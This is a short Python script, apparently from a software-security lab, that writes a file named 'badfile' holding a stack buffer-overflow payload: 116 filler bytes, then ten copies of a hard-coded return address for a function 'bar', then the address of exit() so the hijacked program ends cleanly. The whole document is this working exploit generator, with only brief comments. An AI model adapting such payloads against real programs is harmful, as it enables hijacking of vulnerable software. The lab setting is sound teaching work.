#!/usr/bin/python3

def tobytes(value):
    return (value).to_bytes(4, byteorder="little")


def main():
    bar_addr  = 0x80485e1
    exit_addr = 0xb7e369d0

    content = bytearray(0xaa for i in range(116))
    content += tobytes(0xffffffff)  # This value is not important here.
    for i in range(10):
        content += tobytes(bar_addr)

    # Invoke exit() to exite gracefully at end.
    content += tobytes(exit_addr)

    # Write the string to a file.
    with open("badfile", "wb") as f:
        f.write(content)


if __name__ == "__main__":
    main()
